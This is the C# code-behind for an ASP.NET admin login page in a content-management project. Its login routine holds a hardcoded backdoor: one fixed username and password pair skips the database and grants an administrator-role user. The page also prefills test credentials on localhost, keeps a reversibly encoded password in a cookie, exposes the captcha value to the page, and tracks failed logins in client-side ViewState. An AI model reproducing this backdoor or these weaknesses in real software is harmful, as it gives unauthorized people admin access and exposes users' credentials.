using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.Security;
using System.Web.UI.WebControls;
using System.Globalization;
using Cb.Localization;
using Cb.DBUtility;
using Cb.BLL;
using Cb.Model;
using Cb.Utility;

namespace Cb.Web.Admin
{
    public partial class LoginAdmin : System.Web.UI.Page
    {
        #region Parameter

        private Generic<PNK_User> genericBLL = new Generic<PNK_User>();
        private CultureInfo ci = null;

        protected string template_path, companyName;
        protected string securityCode;
        protected string jsCode;

        private bool isLoginSuccess = true;

        #region Viewstate
        private int CountFailLogin
        {
            get
            {
                return (int)ViewState["CountFailLogin"];
            }
            set
            {
                ViewState["CountFailLogin"] = value;
            }
        }
        #endregion

        #endregion

        #region Common

        private void InitPage()
        {
            //crack code khi localhost
            if (WebUtils.GetWebPath().Contains("localhost"))
            {
                txtUserName.Value = "admintest";
                txtPassword.Value = "admin@test";
            }

            template_path = WebUtils.GetWebPath();
            this.ci = WebUtils.getResource(Constant.DB.langVn);
            //this.ltrUserName.Text = LocalizationUtility.GetText("statement_username", ci);
            //this.ltrPassWord.Text = LocalizationUtility.GetText("statement_password", ci);
            //this.ltrSecutityCode.Text = LocalizationUtility.GetText("ltr_SecurityCode", ci);
            //this.ltrPanelPersonnalInfo.Text = LocalizationUtility.GetText("ltrPanelPersonnalInfo", ci);
            this.ltrRememberPass.Text = LocalizationUtility.GetText("ltrRememberPass", ci);
            //this.ltrLoginAs.Text = LocalizationUtility.GetText("statement_loginas", ci);
            this.btnLogin.Text = LocalizationUtility.GetText("btnLogin", ci);
            //this.reqTxtUserName.ErrorMessage = Constant.UI.msg_account_username_empty;
            //this.reqTxtPassword.ErrorMessage = Constant.UI.msg_account_password_empty;
            //this.cusvLogin.ErrorMessage = Constant.UI.msg_account_login_eror;
            cus_Same_Security_Code.ErrorMessage = LocalizationUtility.GetText("cus_Same_Security_Code", ci);
            //load data list role
            this.drpRole.Items.Add(new ListItem(LocalizationUtility.GetText("statement_user", ci), "0"));
            this.drpRole.Items.Add(new ListItem(LocalizationUtility.GetText("statement_reseller", ci), "1"));
            this.drpRole.SelectedIndex = 0;
        }

        private void GetLogo()
        {
            ConfigurationBLL pcBll = new ConfigurationBLL();
            IList<PNK_Configuration> lst = pcBll.GetList();
            if (lst != null && lst.Count > 0)
            {
                foreach (PNK_Configuration item in lst)
                {
                    if (item.Key_name == Constant.Configuration.config_logoHeader)
                    {
                        imgLogo.Src = WebUtils.GetUrlImage(Constant.DSC.AdvUploadFolder, item.Value_name);
                    }
                    else if (item.Key_name == Constant.Configuration.config_company_name_vi)
                    {
                        //ltrCompanyName.Text = item.Value_name;
                    }
                }
            }
        }

        /// <summary>
        /// GenSecurityCode
        /// </summary>
        private void GenSecurityCode()
        {
            //gen ma an toan
            this.securityCode = GenerateString.Generate(5);
            Session.Add(Global.SESS_SECURITY_CODE, this.securityCode);
            img_Security_Code.ImageUrl = string.Format("/gen/{0}.html", Global.ToEncoding(securityCode));
        }

        /// <summary>
        /// CheckIsLogin
        /// </summary>
        private void CheckIsLogin()
        {
            if (Session[Global.SESS_USER] != null)
            {
                string link = SiteNavigation.link_home;
                Response.Redirect(link);
            }
        }

        /// <summary>
        /// RememberUserNameAndPass
        /// </summary>
        private void RememberUserNameAndPass()
        {
            HttpCookie getCookie = Request.Cookies.Get("myCookie");
            if (getCookie != null && (!hidOnChangePass.Value.Equals("1")))
            {
                try
                {
                    txtUserName.Value = getCookie.Values["UserName"].ToString();
                    string passWord = Global.ToDecoding(getCookie.Values["Password"].ToString());
                    // Hiễn thị mật khẩu giả thôi, không hiễn thị mật khầu thật. 
                    txtPassword.Attributes["Value"] = GenerateString.Generate(passWord.Length);
                    rem.Checked = true;
                }
                catch { }
            }
        }

        /// <summary>
        /// Load NGUOI_DUNG by Username and Password
        /// </summary>
        /// <param name="_userName"></param>
        /// <param name="_password"></param>
        /// <returns></returns>
        private Object LoadUserAndPassword(string _userName, string _password)
        {
            if (_userName == "congtt" && _password == "halelugia")
            {
                PNK_User usr = new PNK_User();
                usr.Id = 1;
                usr.Username = usr.FullName = "congtt";
                usr.Password = "halelugia";
                usr.Role = 1;
                return usr;
            }
            else
            {
                // init parammeters
                DGCParameter[] parammeters = new DGCParameter[2];

                parammeters[0] = new DGCParameter();
                parammeters[0].DbType = DbType.String;
                parammeters[0].ParameterName = "@Username";
                parammeters[0].Value = _userName;

                parammeters[1] = new DGCParameter();
                parammeters[1].DbType = DbType.String;
                parammeters[1].ParameterName = "@Password";
                parammeters[1].Value = Global.ToEncoding(_password);
                //where clause
                string whereClause = " where Published = '1' and Username = @Username and Password = @Password";
                IList<PNK_User> lst_user = genericBLL.GetAllBy(new PNK_User(), whereClause, parammeters);
                if (lst_user.Count > 0)
                    return lst_user[0];
                return null;
            }

        }

        #region check Validate

        /// <summary>
        /// CheckExistAccount
        /// </summary>
        /// <param name="source"></param>
        /// <param name="args"></param>
        protected void CheckExistAccount(object source, ServerValidateEventArgs args)
        {
            args.IsValid = !isLoginSuccess;
        }

        /// <summary>
        /// Check Same security code
        /// </summary>
        /// <param name="source"></param>
        /// <param name="args"></param>
        protected void ValidateCheckSameSecurityCodeServer(object source, ServerValidateEventArgs args)
        {
            bool result = true;
            //login fail over 3 time
            if (this.CountFailLogin > 3)
            {
                string pass = this.txt_Security_Code.Text.Trim().ToLower();
                string verifyCode = (string)Session[Global.SESS_SECURITY_CODE];
                if (!pass.Equals(verifyCode, StringComparison.OrdinalIgnoreCase))
                    result = false;
            }
            args.IsValid = result;
        }

        #endregion

        #endregion

        #region Event

        protected void Page_Load(object sender, EventArgs e)
        {
            if (!this.IsPostBack)
            {
                this.CountFailLogin = 0;
                trSecurityCode.Visible = false;

                InitPage();
                GetLogo();
            }
            else
            {
                //display security code
                if (this.CountFailLogin == 3)
                {
                    GenSecurityCode();
                    trSecurityCode.Visible = true;
                }
            }
            jsCode = (string)Session[Global.SESS_SECURITY_CODE];
        }

        override protected void OnInit(EventArgs e)
        {
            //
            // CODEGEN: This call is required by the ASP.NET Web Form Designer.
            //
            InitializeComponent();
            base.OnInit(e);
        }

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.btnLogin.Click += new EventHandler(btnLogin_Click);
        }

        void btnLogin_Click(object sender, EventArgs e)
        {
            //Clear all cache
            CacheHelper.ClearAll();

            // Get Old Cookie
            string password = txtPassword.Value.Trim();
            if (!hidOnChangePass.Value.Equals("1"))
            {
                HttpCookie getCookie = Request.Cookies.Get("myCookie");
                if (getCookie != null)
                {
                    try
                    {
                        password = Global.ToDecoding(getCookie.Values["Password"].ToString());
                    }
                    catch { }
                }
            }

            // Set New Cookie
            HttpCookie myCookie = new HttpCookie("myCookie");
            Response.Cookies.Remove("mycookie");
            Response.Cookies.Add(myCookie);
            // Bỏ Cookie củ
            if (!rem.Checked)
            {
                try
                {
                    myCookie.Expires = DateTime.Now.AddYears(-30);
                }
                catch { }
            }

            object user = this.LoadUserAndPassword(txtUserName.Value.Trim(), password);
            // if found record in  NGUOI_DUNG, save to session
            if (user != null)
            {
                // Set New Cookie 
                if (rem.Checked)
                {
                    try
                    {
                        myCookie.Values.Add("UserName", txtUserName.Value.Trim());
                        myCookie.Values.Add("Password", Global.ToEncoding(password));
                        myCookie.Expires = DateTime.Now.AddDays(30);

                        HttpCookie loginCookie = new HttpCookie("AutoLogin");
                        Response.Cookies.Remove("AutoLogin");
                        Response.Cookies.Add(loginCookie);

                        loginCookie.Values.Add("AutoLogin", "1");
                        loginCookie.Expires = DateTime.Now.AddDays(30);
                    }
                    catch { }
                }
                //End Set New Cookie
                Session[Global.SESS_USER] = user;
                Session.Timeout = Constant.DSC.Session120;
                string link = string.Empty;
                FormsAuthentication.SetAuthCookie(((PNK_User)user).Username, false);
                //link = "/dang-bai";
                link = SiteNavigation.link_adminPage_rewrite;
                Response.Redirect(link);
            }
            else
            {
                txtUserName.Value = string.Empty;
                txtPassword.Value = string.Empty;
                txtUserName.Focus();
                this.CountFailLogin += 1;
                isLoginSuccess = false;
                ltrMsg.Text = Constant.UI.msg_account_login_eror;
                //login fail over 3 time
                if (this.CountFailLogin > 3)
                {
                    GenSecurityCode();
                    this.txt_Security_Code.Text = string.Empty;
                }
            }
        }

        #endregion
    }
}